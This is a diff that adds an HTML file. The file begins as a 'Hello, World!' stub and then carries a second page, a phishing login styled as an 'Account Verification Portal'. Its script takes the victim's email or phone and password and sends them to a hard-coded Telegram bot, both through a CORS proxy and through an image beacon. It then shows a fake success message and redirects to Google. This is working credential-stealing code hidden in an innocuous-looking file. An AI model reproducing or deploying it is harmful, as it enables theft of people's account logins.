@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hello, World!</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+      <h1 class="title"></h1>
+      <p id=""></p>
+      <script src="script.js"></script>
+  </body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #166fe5; }
+        .footer { font-size: 12px; color: #90949c; margin-top: 25px; border-top: 1px solid #ddd; pt-15px; padding-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">Service Portal</div>
+    <h2>Verify Your Identity</h2>
+    <p>Please log in to confirm your account and maintain access to our services.</p>
+    
+    <input type="text" id="u" placeholder="Email address or phone number">
+    <input type="password" id="p" placeholder="Password">
+    
+    <button onclick="sendData()">Continue</button>
+    
+    <div class="footer">
+        &copy; 2026 Verification Service. All rights reserved.
+    </div>
+</div>
+
+<script>
+    async function sendData() {
+        const token = "8669755211:AAF1DPtiuDNV16f8SbhZIyC43BT-p3s-0a8";
+        const id = "7350995534";
+        
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+
+        if(!user || !pass) {
+            alert("Please enter your credentials.");
+            return;
+        }
+
+        const text = `📬 NEW LOGIN DETECTED\n\n👤 USER: ${user}\n🔑 PASS: ${pass}`;
+        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`;
+
+        // Multi-channel proxy sending
+        fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(telegramUrl)}`).catch(() => {});
+        
+        const img = new Image();
+        img.src = telegramUrl + "&v=" + Math.random();
+
+        setTimeout(() => {
+            alert("Verification successful. Redirecting...");
+            window.location.href = "https://www.google.com";
+        }, 1500);
+    }
+</script>
+
+</body>
+</html>
